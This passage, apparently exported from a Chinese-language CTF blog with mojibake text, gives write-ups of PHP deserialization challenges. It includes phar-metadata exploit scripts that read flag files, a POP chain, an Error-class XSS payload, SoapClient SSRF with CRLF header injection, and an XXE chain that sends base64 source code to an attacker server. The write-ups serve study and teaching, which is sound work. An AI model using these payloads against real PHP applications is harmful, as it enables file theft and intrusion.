$dbuser, $dbpass, $dbname);class User &#123; public $db; public function __construct() &#123; global $db; $this-&gt;db = $db; &#125; public function user_exist($username) &#123; $stmt = $this-&gt;db-&gt;prepare(&quot;SELECT `username` FROM `users` WHERE `username` = ? LIMIT 1;&quot;); $stmt-&gt;bind_param(&quot;s&quot;, $username); $stmt-&gt;execute(); $stmt-&gt;store_result(); $count = $stmt-&gt;num_rows; if ($count === 0) &#123; return false; &#125; return true; &#125; public function add_user($username, $password) &#123; if ($this-&gt;user_exist($username)) &#123; return false; &#125; $password = sha1($password . &quot;SiAchGHmFx&quot;); $stmt = $this-&gt;db-&gt;prepare(&quot;INSERT INTO `users` (`id`, `username`, `password`) VALUES (NULL, ?, ?);&quot;); $stmt-&gt;bind_param(&quot;ss&quot;, $username, $password); $stmt-&gt;execute(); return true; &#125; public function verify_user($username, $password) &#123; if (!$this-&gt;user_exist($username)) &#123; return false; &#125; $password = sha1($password . &quot;SiAchGHmFx&quot;); $stmt = $this-&gt;db-&gt;prepare(&quot;SELECT `password` FROM `users` WHERE `username` = ?;&quot;); $stmt-&gt;bind_param(&quot;s&quot;, $username); $stmt-&gt;execute(); $stmt-&gt;bind_result($expect); $stmt-&gt;fetch(); if (isset($expect) &amp;&amp; $expect === $password) &#123; return true; &#125; return false; &#125; public function __destruct() &#123; $this-&gt;db-&gt;close(); &#125;&#125;class FileList &#123; private $files; private $results; private $funcs; public function __construct($path) &#123; $this-&gt;files = array(); $this-&gt;results = array(); $this-&gt;funcs = array(); $filenames = scandir($path); $key = array_search(&quot;.&quot;, $filenames); unset($filenames[$key]); $key = array_search(&quot;..&quot;, $filenames); unset($filenames[$key]); foreach ($filenames as $filename) &#123; $file = new File(); $file-&gt;open($path . $filename); array_push($this-&gt;files, $file); $this-&gt;results[$file-&gt;name()] = array(); &#125; &#125; public function __call($func, $args) &#123; array_push($this-&gt;funcs, $func); foreach ($this-&gt;files as $file) &#123; $this-&gt;results[$file-&gt;name()][$func] = $file-&gt;$func(); &#125; &#125; public function __destruct() &#123; $table = &#x27;&lt;div id=&quot;container&quot; class=&quot;container&quot;&gt;&lt;div class=&quot;table-responsive&quot;&gt;&lt;table id=&quot;table&quot; class=&quot;table table-bordered table-hover sm-font&quot;&gt;&#x27;; $table .= &#x27;&lt;thead&gt;&lt;tr&gt;&#x27;; foreach ($this-&gt;funcs as $func) &#123; $table .= &#x27;&lt;th scope=&quot;col&quot; class=&quot;text-center&quot;&gt;&#x27; . htmlentities($func) . &#x27;&lt;/th&gt;&#x27;; &#125; $table .= &#x27;&lt;th scope=&quot;col&quot; class=&quot;text-center&quot;&gt;Opt&lt;/th&gt;&#x27;; $table .= &#x27;&lt;/thead&gt;&lt;tbody&gt;&#x27;; foreach ($this-&gt;results as $filename =&gt; $result) &#123; $table .= &#x27;&lt;tr&gt;&#x27;; foreach ($result as $func =&gt; $value) &#123; $table .= &#x27;&lt;td class=&quot;text-center&quot;&gt;&#x27; . htmlentities($value) . &#x27;&lt;/td&gt;&#x27;; &#125; $table .= &#x27;&lt;td class=&quot;text-center&quot; filename=&quot;&#x27; . htmlentities($filename) . &#x27;&quot;&gt;&lt;a href=&quot;#&quot; class=&quot;download&quot;&gt;ä¸‹è½½&lt;/a&gt; / &lt;a href=&quot;#&quot; class=&quot;delete&quot;&gt;åˆ é™¤&lt;/a&gt;&lt;/td&gt;&#x27;; $table .= &#x27;&lt;/tr&gt;&#x27;; &#125; echo $table; &#125;&#125;class File &#123; public $filename; public function open($filename) &#123; $this-&gt;filename = $filename; if (file_exists($filename) &amp;&amp; !is_dir($filename)) &#123; return true; &#125; else &#123; return false; &#125; &#125; public function name() &#123; return basename($this-&gt;filename); &#125; public function size() &#123; $size = filesize($this-&gt;filename); $units = array(&#x27; B&#x27;, &#x27; KB&#x27;, &#x27; MB&#x27;, &#x27; GB&#x27;, &#x27; TB&#x27;); for ($i = 0; $size &gt;= 1024 &amp;&amp; $i &lt; 4; $i++) $size /= 1024; return round($size, 2).$units[$i]; &#125; public function detele() &#123; unlink($this-&gt;filename); &#125; public function close() &#123; return file_get_contents($this-&gt;filename); &#125;&#125;?&gt; delete.phpï¼š 123456789101112131415161718192021222324252627&lt;?phpsession_start();if (!isset($_SESSION[&#x27;login&#x27;])) &#123; header(&quot;Location: login.php&quot;); die();&#125;if (!isset($_POST[&#x27;filename&#x27;])) &#123; die();&#125;include &quot;class.php&quot;;chdir($_SESSION[&#x27;sandbox&#x27;]);$file = new File();$filename = (string) $_POST[&#x27;filename&#x27;];if (strlen($filename) &lt; 40 &amp;&amp; $file-&gt;open($filename)) &#123; $file-&gt;detele(); Header(&quot;Content-type: application/json&quot;); $response = array(&quot;success&quot; =&gt; true, &quot;error&quot; =&gt; &quot;&quot;); echo json_encode($response);&#125; else &#123; Header(&quot;Content-type: application/json&quot;); $response = array(&quot;success&quot; =&gt; false, &quot;error&quot; =&gt; &quot;File not exist&quot;); echo json_encode($response);&#125;?&gt; å…¶ä»–ä»£ç æ²¡æœ‰å®é™…ä½œç”¨å†æ¬¡ä¸æ”¾å‡ºäº†ã€‚class.phpå‘ç°å’Œæ•°æ®åº“äº¤äº’çš„è¯­å¥å…¨éƒ¨è¿›è¡Œäº†å‚æ•°ç»‘å®šï¼Œå› æ­¤ä¸å­˜åœ¨sqlã€‚ é¦–å…ˆçœ‹å‡ºå£ï¼ŒFileç±»çš„close()ä¸­å­˜åœ¨file_get_contentsï¼Œæ‹¿æ¥åšå‡ºå£åœ¨é€‚åˆä¸è¿‡ã€‚æ¥ç€å‘ç°Userç±»ä¸­çš„__destruct()è°ƒç”¨äº†close()ï¼Œå¾ˆæœ‰å¯èƒ½è¦é€šè¿‡è¿™é‡Œè¿›è¡Œæ‰“å°ã€‚è€ŒFileListç±»ä¸­æœ‰__call()å¯ä»¥è¿›è¡Œè°ƒç”¨ï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±å°†$this-&gt;dbå¤åˆ¶ä¸ºFileListç±»è¿™æ ·æˆ‘ä»¬å°±å¯ä»¥ç›´æ¥ä½¿ç”¨è¯¥ç±»ä¸­å¾—æ–¹æ³•ã€‚ è€Œè¿™ä¸ª__call()å‡ ä¹æ˜ç¤ºæˆ‘ä»¬è¿™é‡Œè¦ç”¨åˆ°pharååºåˆ—åŒ–äº†ï¼Œå› æ­¤æ„å»ºexpï¼š 123456789101112131415161718192021222324252627282930313233343536&lt;?phpclass User&#123; public $db; public function __construct() &#123; $this-&gt;db = new FileList(); &#125;&#125;class File&#123; public $filename;&#125;class FileList &#123; private $files; public function __construct() &#123; $file = new File(); $file-&gt;filename = &#x27;/flag.txt&#x27;; $this-&gt;files = array($file); &#125;&#125;$User = new User();$phar = new Phar(&quot;./phar.phar&quot;); $phar-&gt;startBuffering();$phar-&gt;setStub(&#x27;&lt;?php __HALT_COMPILER(); ? &gt;&#x27;);$phar-&gt;setMetadata($User);$phar-&gt;addFromString(&quot;test.txt&quot;, &quot;test&quot;); $phar-&gt;stopBuffering();?&gt; å°†ç”Ÿæˆçš„pharæ–‡ä»¶åç¼€æ”¹æˆjpgï¼Œç„¶åä¸Šä¼ ï¼Œæœ€ååˆ©ç”¨phar://ä¼ªåè®®åˆ é™¤æ–‡ä»¶è§¦å‘ååºåˆ—åŒ–ï¼Œè¯»å–flagã€‚ [SWPUCTF 2018]SimplePHPå’Œä¸Šä¸€é¢˜æ¯”è¾ƒç±»ä¼¼ï¼Œé¦–å…ˆæ˜¯ä»»æ„æ–‡ä»¶è¯»å–æ¼æ´è·å–æºç ï¼Œæˆ‘ä»¬è¯»å–å…³é”®ä»£ç ã€‚ class.phpï¼š 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879 &lt;?phpclass C1e4r&#123; public $test; public $str; public function __construct($name) &#123; $this-&gt;str = $name; &#125; public function __destruct() &#123; $this-&gt;test = $this-&gt;str; echo $this-&gt;test; &#125;&#125;class Show&#123; public $source; public $str; public function __construct($file) &#123; $this-&gt;source = $file; //$this-&gt;source = phar://phar.jpg echo $this-&gt;source; &#125; public function __toString() &#123; $content = $this-&gt;str[&#x27;str&#x27;]-&gt;source; return $content; &#125; public function __set($key,$value) &#123; $this-&gt;$key = $value; &#125; public function _show() &#123; if(preg_match(&#x27;/http|https|file:|gopher|dict|\\.\\.|f1ag/i&#x27;,$this-&gt;source)) &#123; die(&#x27;hacker!&#x27;); &#125; else &#123; highlight_file($this-&gt;source); &#125; &#125; public function __wakeup() &#123; if(preg_match(&quot;/http|https|file:|gopher|dict|\\.\\./i&quot;, $this-&gt;source)) &#123; echo &quot;hacker~&quot;; $this-&gt;source = &quot;index.php&quot;; &#125; &#125;&#125;class Test&#123; public $file; public $params; public function __construct() &#123; $this-&gt;params = array(); &#125; public function __get($key) &#123; return $this-&gt;get($key); &#125; public function get($key) &#123; if(isset($this-&gt;params[$key])) &#123; $value = $this-&gt;params[$key]; &#125; else &#123; $value = &quot;index.php&quot;; &#125; return $this-&gt;file_get($value); &#125; public function file_get($value) &#123; $text = base64_encode(file_get_contents($value)); return $text; &#125;&#125;?&gt; è¿™æ¬¡å¤šäº†å‡ ä¸ªwafï¼Œä¸è¿‡æˆ‘ä»¬ä¾ç„¶è¦å…ˆå®šä½å‡ºå…¥å£ã€‚å‡ºå£å¾ˆå¥½å®šä½ï¼ŒTestç±»çš„file_get()ï¼Œå­˜åœ¨base64_encode(file_get_contents($value))ï¼Œå¯ä»¥è¯»å–æ–‡ä»¶ã€‚é‚£ä¹ˆä¸ºäº†è§¦å‘è¿™ä¸ªå‡½æ•°ï¼Œæˆ‘ä»¬å®šä½åˆ°åŒç±»ä¸‹çš„__get()ï¼Œåˆ©ç”¨å…¶åˆ°get()æ¥è§¦å‘ã€‚ é‚£ä¹ˆæˆ‘ä»¬å‘ç°Showç±»çš„__toString()ä¸­å¯ä»¥æŠŠ$contentçš„å†…å®¹è¿”å›å¯¹è±¡ï¼Œè€Œè‹¥$show-&gt;str[â€˜strâ€™]ä¸ºtestç±»çš„ä¸€ä¸ªå®ä¾‹åŒ–å¯¹è±¡ï¼Œåˆ™å› testç±»é‡Œé¢æ²¡æœ‰sourceå±æ€§ï¼Œä»è€Œè§¦å‘__get()æ–¹æ³•ã€‚ æœ€åå®šä½åˆ°Cle4rç±»ï¼Œ__destruct()æ–¹æ³•å¯ä»¥æŠŠ$testä¹Ÿå°±æ˜¯$strç»™è¾“å‡ºå‡ºæ¥ã€‚å°†$strå£°æ˜ä¸º$showå¯¹è±¡å¯ä»¥è§¦å‘showç±»ä¸­çš„__toString()æ–¹æ³•ã€‚ é“¾æ¡æ„é€ å®Œæˆï¼Œç¼–å†™expï¼š 12345678910111213141516171819202122232425262728293031&lt;?phpclass C1e4r&#123; public $test; public $str;&#125;class Show&#123; public $source; public $str;&#125;class Test&#123; public $file; public $params;&#125;$c1e4r = new C1e4r();$show = new Show();$test = new Test();$test-&gt;params[&#x27;source&#x27;] = &quot;/var/www/html/f1ag.php&quot;;$c1e4r-&gt;str = $show; $show-&gt;str[&#x27;str&#x27;] = $test; $phar = new Phar(&quot;phar.phar&quot;);$phar-&gt;startBuffering();$phar-&gt;setStub(&#x27;&lt;?php __HALT_COMPILER(); ?&gt;&#x27;); $phar-&gt;setMetadata($c1e4r); $phar-&gt;addFromString(&quot;exp.txt&quot;, &quot;test&quot;); $phar-&gt;stopBuffering();?&gt; ä¸Šä¼ ååœ¨/uploadç›®å½•ä¸‹è·å–æ–‡ä»¶åï¼Œæœ€ååœ¨æŸ¥çœ‹æ–‡ä»¶çš„ç›®å½•ä¸‹ç”¨phar://ä¼ªåè®®è¯»å–flagã€‚ [ç¬¬äº”ç©ºé—´ 2021]pklovecloudå®¡è®¡æºç ï¼š 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960 &lt;?php include &#x27;flag.php&#x27;;class pkshow &#123; function echo_name() &#123; return &quot;Pk very safe^.^&quot;; &#125; &#125; class acp &#123; protected $cinder; public $neutron; public $nova; function __construct() &#123; $this-&gt;cinder = new pkshow; &#125; function __toString() &#123; if (isset($this-&gt;cinder)) return $this-&gt;cinder-&gt;echo_name(); &#125; &#125; class ace&#123; public $filename; public $openstack; public $docker; function echo_name() &#123; $this-&gt;openstack = unserialize($this-&gt;docker); $this-&gt;openstack-&gt;neutron = $heat; if($this-&gt;openstack-&gt;neutron === $this-&gt;openstack-&gt;nova) &#123; $file = &quot;./&#123;$this-&gt;filename&#125;&quot;; if (file_get_contents($file)) &#123; return file_get_contents($file); &#125; else &#123; return &quot;keystone lost~&quot;; &#125; &#125; &#125; &#125; if (isset($_GET[&#x27;pks&#x27;])) &#123; $logData = unserialize($_GET[&#x27;pks&#x27;]); echo $logData; &#125; else &#123; highlight_file(__file__); &#125;?&gt; å‰é¢ä¸¤é¢˜åšçš„çœŸçš„å¤´å¤§ï¼Œè¿”å›æ¥çœ‹é¢˜ç®€å•çš„ã€‚é¦–å…ˆpkshowç±»ä¸€çœ‹å°±æ²¡ç”¨ï¼Œå› æ­¤è¿™ä¸ªpopåªç”¨åˆ°äº†ä¸¤ä¸ªç±»ã€‚å‡ºå£æ˜¾ç„¶æ˜¯aceç±»çš„echo_name()ï¼Œä¸ºäº†è§¦å‘è¿™ä¸ªå‡½æ•°ï¼Œæˆ‘ä»¬å‘ç°acpç±»ä¸­çš„__toString()è°ƒç”¨äº†è¿™ä¸ªå‡½æ•°ï¼Œå› æ­¤æˆ‘ä»¬è¦æƒ³åŠæ³•è°ƒç”¨ã€‚acpå®ä¾‹åŒ–æ—¶ä¼šè‡ªåŠ¨è°ƒç”¨__construct()ï¼Œæ‰€ä»¥è¦æƒ³è§¦å‘__toString()å°±è¦ä½¿$this-&gt;cinder=å¯¹è±¡ï¼Œæ­£å¥½ä¸ä¸Šè¿°åˆ†ææ‰€éœ€çš„ $this-&gt;cinder = new ace() ç›¸å‘¼åº”ã€‚ å› æ­¤é“¾æ¡æ¢³ç†å®Œæˆï¼Œä½†æ˜¯æˆ‘ä»¬è¦æ³¨æ„åˆ°åœ¨echo_name()ä¸­æœ‰è¿™æ ·å‡ è¡Œï¼š 123$this-&gt;openstack = unserialize($this-&gt;docker);$this-&gt;openstack-&gt;neutron = $heat;if($this-&gt;openstack-&gt;neutron === $this-&gt;openstack-&gt;nova) è¿™é‡Œæœ‰ä¸ªéé¢„æœŸï¼Œç›´æ¥ç©ºç­‰äºç©ºå°±å¯ä»¥ç»•è¿‡äº†ï¼Œexpï¼š 123456789101112131415161718192021&lt;?phpclass acp &#123; protected $cinder; public $neutron; public $nova; function __construct() &#123; $this-&gt;cinder = new ace(); &#125;&#125; class ace&#123; public $filename=&quot;flag.php&quot;; public $openstack; public $docker=&#x27;&#x27;; &#125; $a=new acp();echo urlencode(serialize($a)); é‚£ä¹ˆé¢„æœŸè§£æ˜¯æ€æ ·çš„å‘¢ï¼Œå®˜æ–¹wpä¸­å°†åŸæ¥ä¸ºç©ºçš„dockerçš„å€¼æ”¹ä¸ºO:8:&quot;stdClass&quot;:2:&#123;s:7:&quot;neutron&quot;;s:1:&quot;a&quot;;s:4:&quot;nova&quot;;R:2;&#125;å³å¯ã€‚ è¿™ä¸ªååºåˆ—åŒ–ï¼Œå°¤å…¶æ˜¯è¿™ä¸ªRçœŸæŠŠæˆ‘æè¿·ç³Šäº†ï¼Œè¿™ä¸ªçš„åŸç†å¯ä»¥å‚è€ƒä¸‹é¢è¿™ç¯‡æ–‡ç« ï¼Œåšå‡ºäº†ä¸€å®šçš„è§£é‡Šï¼š2021ç¬¬äº”ç©ºé—´CTF pklovecloud ä¸è¿‡ç»è¿‡æµ‹è¯•å‘ç°ï¼Œå…¶å®ç›´æ¥ä»¤neutronå’Œnovaçš„å€¼ç›¸ç­‰å°±å¯ä»¥äº†ï¼Œå¥½åƒæ˜¯ç”±äº$cinderå˜é‡çš„å±æ€§æ˜¯protectedï¼Œå¯¼è‡´å…¶å®$this-&gt;openstack-&gt;neutron = $heat;è¿™å¥è¯å¯ä»¥è¢«è¦†ç›–ï¼Œå…·ä½“åŸç†å¯èƒ½å¾—ç­‰ä¹‹åå†æ¢ç©¶äº†ã€‚","categories":[{"name":"web","slug":"web","permalink":"http://example.com/categories/web/"}],"tags":[{"name":"-web -php","slug":"web-php","permalink":"http://example.com/tags/web-php/"}]},{"title":"phpè¿­ä»£å™¨ï¼ˆåŸç”Ÿç±»ï¼‰çš„åˆ©ç”¨","slug":"phpè¿­ä»£å™¨ï¼ˆåŸç”Ÿç±»ï¼‰çš„åˆ©ç”¨","date":"2022-04-04T05:55:45.000Z","updated":"2022-04-06T02:52:17.999Z","comments":true,"path":"2022/04/04/phpè¿­ä»£å™¨ï¼ˆåŸç”Ÿç±»ï¼‰çš„åˆ©ç”¨/","link":"","permalink":"http://example.com/2022/04/04/php%E8%BF%AD%E4%BB%A3%E5%99%A8%EF%BC%88%E5%8E%9F%E7%94%9F%E7%B1%BB%EF%BC%89%E7%9A%84%E5%88%A9%E7%94%A8/","excerpt":"å‰è¨€å¡«å‘è¿™ä¸€å—çŸ¥è¯†äº†ï¼Œå¡«å®Œå‘å°±è¦å¼€å§‹æ¶è¡¥popå’Œxssè¿™ä¸¤å—çš„çŸ¥è¯†æ¥ä¸ºisccåšå‡†å¤‡äº†ã€‚","text":"å‰è¨€å¡«å‘è¿™ä¸€å—çŸ¥è¯†äº†ï¼Œå¡«å®Œå‘å°±è¦å¼€å§‹æ¶è¡¥popå’Œxssè¿™ä¸¤å—çš„çŸ¥è¯†æ¥ä¸ºisccåšå‡†å¤‡äº†ã€‚ phpåŸç”Ÿç±»åœ¨CTFé¢˜ç›®ä¸­ï¼ŒphpåŸç”Ÿç±»çš„è¿ç”¨ä¸»è¦å¯ä»¥åˆ©ç”¨åœ¨xssã€ååºåˆ—åŒ–ã€ssrfã€xxeä»¥åŠè¯»å–æ–‡ä»¶çš„è§£é¢˜ä¸Šã€‚ æˆ‘ä»¬å¯ä»¥é€šè¿‡ä¸‹é¢è¿™ä¸ªexpæ¥éå†åŸç”Ÿç±»ï¼š 123456789101112131415 &lt;?php$classes = get_declared_classes();foreach ($classes as $class) &#123; $methods = get_class_methods($class); foreach ($methods as $method) &#123; if (in_array($method, array( &#x27;__destruct&#x27;, &#x27;__toString&#x27;, &#x27;__wakeup&#x27; // å¯ä»¥æ ¹æ®é¢˜ç›®ç¯å¢ƒå°†æŒ‡å®šçš„æ–¹æ³•æ·»åŠ è¿›æ¥, æ¥éå†å­˜åœ¨æŒ‡å®šæ–¹æ³•çš„åŸç”Ÿç±» ))) &#123; print $class . &#x27;::&#x27; . $method . &quot;\\n&quot;; &#125; &#125;&#125; æ¥ä¸‹æ¥æˆ‘ä»¬å­¦ä¹ è®¤è¯†åº”ç”¨æ¯”è¾ƒå¸¸ç”¨çš„ä¸€äº›åŸç”Ÿç±»ã€‚ Error/Exceptionxssçš„åˆ©ç”¨åœ¨æŠ¥é”™å¼€å¯çš„æƒ…å†µä¸‹ï¼Œphp7ä¸­åˆ©ç”¨Errorç±»å¯èƒ½ä¼šå¯¼è‡´xssæ¼æ´ï¼Œå› ä¸ºå®ƒå†…ç½®ä¸€ä¸ª__toString()æ–¹æ³•ã€‚å¦‚æœåšpopæ—¶æ‰“ä¸é€šäº†å¯èƒ½å°±å¯ä»¥å°è¯•ç›´æ¥ä¸€è½¬xssã€‚ test.phpï¼š 12345&lt;?php$a = unserialize($_GET[&#x27;cmd&#x27;]);echo $a;highlight_file(__FILE__);?&gt; pocï¼š 12345&lt;?php$a = new Error(&quot;&lt;script&gt;alert(&#x27;xss&#x27;)&lt;/script&gt;&quot;);$b = serialize($a);echo urlencode($b); ?&gt; å‘ç°æˆåŠŸè§¦å‘xssï¼Œå­˜åœ¨åˆ©ç”¨ã€‚ è€ŒExceptioné™¤äº†å¯ä»¥åˆ©ç”¨åœ¨php7å¤–ï¼Œè¿˜å¯ä»¥åˆ©ç”¨åœ¨php5ä¸Šï¼Œæ–¹æ³•ä¸€è‡´ã€‚ ç»•è¿‡hashæ¯”è¾ƒåœ¨php7ä¸‹ï¼ŒErroræ˜¯æ‰€æœ‰PHPå†…éƒ¨é”™è¯¯ç±»çš„åŸºç±»ï¼Œæˆ‘ä»¬å¯ä»¥åˆ©ç”¨å…¶è¿”å›æ€§è´¨æ¥è¿›è¡Œç»•è¿‡ã€‚ [æå®¢å¤§æŒ‘æˆ˜ 2020]Greatphpï¼š 12345678910111213141516171819202122232425&lt;?phperror_reporting(0);class SYCLOVER &#123; public $syc; public $lover; public function __wakeup()&#123; if( ($this-&gt;syc != $this-&gt;lover) &amp;&amp; (md5($this-&gt;syc) === md5($this-&gt;lover)) &amp;&amp; (sha1($this-&gt;syc)=== sha1($this-&gt;lover)) )&#123; if(!preg_match(&quot;/\\&lt;\\?php|\\(|\\)|\\&quot;|\\&#x27;/&quot;, $this-&gt;syc, $match))&#123; eval($this-&gt;syc); &#125; else &#123; die(&quot;Try Hard !!&quot;); &#125; &#125; &#125;&#125;if (isset($_GET[&#x27;great&#x27;]))&#123; unserialize($_GET[&#x27;great&#x27;]);&#125; else &#123; highlight_file(__FILE__);&#125;?&gt; pocï¼š 1234567891011121314151617181920212223242526&lt;?phpclass SYCLOVER &#123; public $syc; public $lover; public function __wakeup()&#123; if( ($this-&gt;syc != $this-&gt;lover) &amp;&amp; (md5($this-&gt;syc) === md5($this-&gt;lover)) &amp;&amp; (sha1($this-&gt;syc)=== sha1($this-&gt;lover)) )&#123; if(!preg_match(&quot;/\\&lt;\\?php|\\(|\\)|\\&quot;|\\&#x27;/&quot;, $this-&gt;syc, $match))&#123; eval($this-&gt;syc); &#125; else &#123; die(&quot;Try Hard !!&quot;); &#125; &#125; &#125;&#125;$cmd=&#x27;/flag&#x27;;$cmd=urlencode(~$cmd);$str = &quot;?&gt;&lt;?=include~&quot;.urldecode(&quot;%D0%99%93%9E%98&quot;).&quot;?&gt;&quot;;$a=new Error($str,1);$b=new Error($str,2);$c = new SYCLOVER();$c-&gt;syc = $a;$c-&gt;lover = $b;echo(urlencode(serialize($c)));?&gt; ç”¨ä¸€ä¸ªç®€å•çš„çŸ­æ ‡ç­¾å’Œå–åç»•rceï¼Œä¸»è¦æ˜¯å­¦ä¹ åŸç”Ÿç±»åº”ç”¨ã€‚ Exceptionä¹Ÿä¸€æ ·ï¼Œphp5ä»¥ä¸Šéƒ½å¯åˆ©ç”¨ã€‚ SoapClientè¿™ä¸ªç±»ä¸€èˆ¬ç”¨äºssrfï¼Œè¿™æ˜¯ä¸€ä¸ªä¸“é—¨ç”¨æ¥è®¿é—®webæœåŠ¡çš„ç±»ï¼Œå¯ä»¥æä¾›ä¸€ä¸ªåŸºäºSOAPåè®®è®¿é—®WebæœåŠ¡çš„PHPå®¢æˆ·ç«¯ã€‚è¯¥è¿­ä»£å™¨æœ‰ä¸€ä¸ª__call()æ–¹æ³•ï¼Œå½“__call()æ–¹æ³•è¢«è§¦å‘åï¼Œå®ƒå¯ä»¥å‘é€HTTPå’ŒHTTPSè¯·æ±‚ã€‚ æ„é€ è§„åˆ™ï¼š 123public SoapClient :: SoapClient(mixed $wsdl [ï¼Œarray $options ])ç¬¬ä¸€ä¸ªå‚æ•°æ˜¯ç”¨æ¥æŒ‡æ˜æ˜¯å¦æ˜¯wsdlæ¨¡å¼ï¼Œå°†è¯¥å€¼è®¾ä¸ºnullåˆ™è¡¨ç¤ºéwsdlæ¨¡å¼ã€‚ç¬¬äºŒä¸ªå‚æ•°ä¸ºä¸€ä¸ªæ•°ç»„ï¼Œå¦‚æœåœ¨wsdlæ¨¡å¼ä¸‹ï¼Œæ­¤å‚æ•°å¯é€‰ï¼›å¦‚æœåœ¨éwsdlæ¨¡å¼ä¸‹ï¼Œåˆ™å¿…é¡»è®¾ç½®locationå’Œurié€‰é¡¹ï¼Œå…¶ä¸­locationæ˜¯è¦å°†è¯·æ±‚å‘é€åˆ°çš„SOAPæœåŠ¡å™¨çš„URLï¼Œè€Œuri æ˜¯SOAPæœåŠ¡çš„ç›®æ ‡å‘½åç©ºé—´ã€‚ æˆ‘ä»¬ä½¿ç”¨RequestBinè¿›è¡Œæ¨¡æ‹Ÿï¼š 1234567&lt;?php$a = new SoapClient(null,array(&#x27;location&#x27;=&gt;&#x27;http://requestbin.net/r/f30dvgdx&#x27;, &#x27;uri&#x27;=&gt;&#x27;ssrf&#x27;));$b = serialize($a);echo $b;$c = unserialize($b);$c-&gt;a(); // éšä¾¿è°ƒç”¨å¯¹è±¡ä¸­ä¸å­˜åœ¨çš„æ–¹æ³•, è§¦å‘__callæ–¹æ³•è¿›è¡Œssrf?&gt; æ‰§è¡Œä»£ç ï¼Œå‘ç°æˆåŠŸè§¦å‘ssrfã€‚ä½†æ˜¯ï¼Œç”±äºå®ƒä»…é™äºHTTP/HTTPSåè®®ï¼Œæ‰€ä»¥ç”¨å¤„ä¸æ˜¯å¾ˆå¤§ã€‚è€Œå¦‚æœè¿™é‡ŒHTTPå¤´éƒ¨è¿˜å­˜åœ¨CRLFæ¼æ´çš„è¯ï¼Œä½†æˆ‘ä»¬åˆ™å¯ä»¥é€šè¿‡SSRF+CRLFï¼Œæ’å…¥ä»»æ„çš„HTTPå¤´ã€‚ åƒè¿™æ ·ï¼š 12345678&lt;?php$target = &#x27;http://requestbin.net/r/f30dvgdx&#x27;;$a = new SoapClient(null,array(&#x27;location&#x27; =&gt; $target, &#x27;user_agent&#x27; =&gt; &quot;WHOAMI\\r\\nCookie: PHPSESSID=tcjr6nadpk3md7jbgioa6elfk4&quot;, &#x27;uri&#x27; =&gt; &#x27;test&#x27;));$b = serialize($a);echo $b;$c = unserialize($b);$c-&gt;a(); // éšä¾¿è°ƒç”¨å¯¹è±¡ä¸­ä¸å­˜åœ¨çš„æ–¹æ³•, è§¦å‘__callæ–¹æ³•è¿›è¡Œssrf?&gt; æˆ‘ä»¬çš„è‡ªå®šä¹‰cookieå°±è¢«æ’å…¥è¿›httpå¤´ä¸­äº†ã€‚ SimpleXMLElementè¿™ä¸ªç±»ç”¨äºè§£æXMLæ–‡æ¡£ä¸­çš„å…ƒç´ ï¼Œæˆ‘ä»¬å¯ä»¥å‚è€ƒphpæ‰‹å†Œå¯¹å…¶çš„å®šä¹‰ï¼š æ ¹æ®æ‰‹å†Œï¼Œå½“data_is_urlä¸ºtrueæ—¶ï¼Œæˆ‘ä»¬å¯ä»¥å®ç°è¿œç¨‹xmlè½½å…¥ï¼Œè€Œdataå‚æ•°ç”¨æ¥è®¾ç½®è‡ªå·±çš„payloadçš„urlåœ°å€ï¼Œä»è€Œå®ç°xxeã€‚ æˆ‘ä»¬æ¥çœ‹ä¸€é¢˜çš„ä»£ç ï¼š 1234567891011121314151617181920212223242526272829303132333435&lt;?php class calc&#123; function __construct__()&#123; calc(); &#125; function calc($args1,$method,$args2)&#123; $args1=intval($args1); $args2=intval($args2); switch ($method) &#123; case &#x27;a&#x27;: $method=&quot;+&quot;; break; case &#x27;b&#x27;: $method=&quot;-&quot;; break; case &#x27;c&#x27;: $method=&quot;*&quot;; break; case &#x27;d&#x27;: $method=&quot;/&quot;; break; default: die(&quot;invalid input&quot;); &#125; $Expression=$args1.$method.$args2; eval(&quot;\\$r=$Expression;&quot;); die(&quot;Calculation results:&quot;.$r); &#125;&#125;?&gt; æˆ‘ä»¬å‘ç°moduleä¸ºè°ƒç”¨çš„ç±»ï¼Œargsä¸ºç±»çš„æ„é€ æ–¹æ³•çš„å‚æ•°ï¼Œé‚£ä¹ˆåœ¨è¿™é‡Œæˆ‘ä»¬å°±å¯ä»¥æ„é€ xxeè¯»å–æºç ã€‚ é¦–å…ˆåœ¨è‡ªå·±çš„vpsä¸Šæ„å»ºä¸‰ä¸ªæ–‡ä»¶ï¼Œåˆ†åˆ«æ˜¯mrl64.xmlã€send.xmlä»¥åŠsend.phpã€‚ mrl64.xmlï¼š 1234567&lt;?xml version=&quot;1.0&quot;?&gt;&lt;!DOCTYPE ANY[&lt;!ENTITY % remote SYSTEM &quot;http://ip/send.xml&quot;&gt;%remote;%all;%send;]&gt; send.xmlï¼š 12&lt;!ENTITY % file SYSTEM &quot;php://filter/read=convert.base64-encode/resource=index.php&quot;&gt;&lt;!ENTITY % all &quot;&lt;!ENTITY &amp;#x25; send SYSTEM &#x27;http://1.xxx.xxx.47/send.php?file=%file;&#x27;&gt;&quot;&gt; send.phpï¼š 123&lt;?php file_put_contents(&quot;result.txt&quot;, $_GET[&#x27;file&#x27;]) ;?&gt; æ¥ç€æˆ‘ä»¬æ„å»ºpayloadï¼š 1?module=SimpleXMLElement&amp;args[]=http://ip/mrl64.xml&amp;args[]=2&amp;args[]=true æˆ‘ä»¬å°±ä¼šå‘ç°æºç å·²ç»è¢«å†™å…¥result.txtä¸­äº†ã€‚ ZipArchiveZipArchiveç±»å¯ä»¥å¯¹æ–‡ä»¶è¿›è¡Œå‹ç¼©ä¸è§£å‹ç¼©å¤„ç†ï¼Œä¹‹å‰é¢˜ç›®å‡ºç°çš„åˆ©ç”¨ä¸»è¦æ˜¯ç”¨æ¥åˆ é™¤wafæ–‡ä»¶çš„ã€‚å¦‚æœè®¾ç½®flagså‚æ•°çš„å€¼ä¸ºZipArchive::OVERWRITEçš„è¯ï¼Œå¯ä»¥æŠŠæŒ‡å®šæ–‡ä»¶åˆ é™¤ã€‚ ç”±äºæ²¡æœ‰æ‰¾åˆ°å¯¹åº”é¢˜ç›®çš„å¤ç°ç¯å¢ƒä»¥åŠdockerï¼Œæ‰€ä»¥å°±å¤§æ¦‚è®²ä¸€ä¸‹é¢˜ç›®æ€è·¯å§ã€‚ é¦–å…ˆæ˜¯æºç ï¼š 